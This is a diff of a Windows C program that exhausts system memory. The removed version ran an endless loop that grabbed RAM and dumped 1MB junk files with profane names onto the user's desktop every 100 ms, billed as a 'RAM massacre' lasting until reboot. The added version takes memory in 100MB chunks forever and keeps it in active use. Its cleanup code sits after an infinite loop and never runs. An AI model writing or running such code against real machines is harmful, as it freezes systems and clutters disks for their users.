@@ -2,50 +2,57 @@
 #include <stdlib.h>
 #include <string.h>
 #include <windows.h>
-#include <shlobj.h>
 
-#define CHUNK_SIZE (1024 * 1024)  // 1MB chunks for memory allocation
-#define FILE_SIZE (1024 * 1024)   // 1MB files for desktop clutter
+#define CHUNK_SIZE (100 * 1024 * 1024) // 100MB chunks
 
 int main() {
-    size_t file_count = 0;
+ size_t total_allocated = 0; // Track total memory allocated in bytes
+ void **chunks = NULL; // Array to store pointers to allocated chunks
+ size_t chunk_count = 0; // Number of chunks allocated
+ size_t attempts = 0; // Count allocation attempts
 
-    // Get the desktop path
-    char desktop_path[MAX_PATH];
-    SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop_path);
-    printf("Desktop path: %s\n", desktop_path);
-    
-    printf("Starting the RAM massacre. This will run until you reboot.\n");
+ printf("Starting to eat RAM. This will run until you stop it or the system limits it.\n");
 
-    while (1) {
-        // Allocate a chunk of RAM
-        void *chunk = malloc(CHUNK_SIZE);
-        if (chunk) {
-            memset(chunk, 69, CHUNK_SIZE);  // Fill memory with data
-        } else {
-            printf("Failed to allocate more memory.\n");
-        }
+ while (1) {
+ attempts++;
+ // Allocate a 100MB chunk
+ void *chunk = malloc(CHUNK_SIZE);
+ if (chunk) {
+ // Fill the chunk with data to ensure it’s committed
+ memset(chunk, 69, CHUNK_SIZE);
+ total_allocated += CHUNK_SIZE;
 
-        // Create a file on the desktop
-        char filename[256];
-        sprintf(filename, "%s\\fuckfile_%zu.txt", desktop_path, file_count++);
-        FILE *file = fopen(filename, "wb");
-        if (file) {
-            char *buffer = malloc(FILE_SIZE);
-            if (buffer) {
-                memset(buffer, 'X', FILE_SIZE);  // Fill buffer with 'X'
-                fwrite(buffer, 1, FILE_SIZE, file);
-                free(buffer);
-            }
-            fclose(file);
-        } else {
-            printf("Failed to create file: %s\n", filename);
-        }
+ // Store the pointer in an array
+ void **temp = realloc(chunks, (chunk_count + 1) * sizeof(void*));
+ if (temp) {
+ chunks = temp;
+ chunks[chunk_count] = chunk;
+ chunk_count++;
+ } else {
+ printf("Failed to realloc chunk array after %zu chunks.\n", chunk_count);
+ }
 
-        printf("Files created: %zu\n", file_count);
+ // Report progress
+ printf("Allocated %zu MB so far after %zu attempts.\n", 
+ total_allocated / (1024 * 1024), attempts);
 
-        Sleep(100);  // 100ms delay to stretch out the chaos
-    }
+ // Periodically write to a random chunk to keep memory in the working set
+ if (chunk_count > 0) {
+ size_t idx = rand() % chunk_count;
+ memset(chunks[idx], 42, CHUNK_SIZE);
+ }
+ } else {
+ printf("Failed to allocate more memory after %zu attempts and %zu MB.\n", 
+ attempts, total_allocated / (1024 * 1024));
+ // Keep running to test limits, but report failure
+ }
+ }
 
-    return 0;
+ // Note: This is an infinite loop, so we never reach here
+ // Included for completeness to avoid memory leaks if adapted later
+ for (size_t i = 0; i < chunk_count; i++) {
+ free(chunks[i]);
+ }
+ free(chunks);
+ return 0;
 }
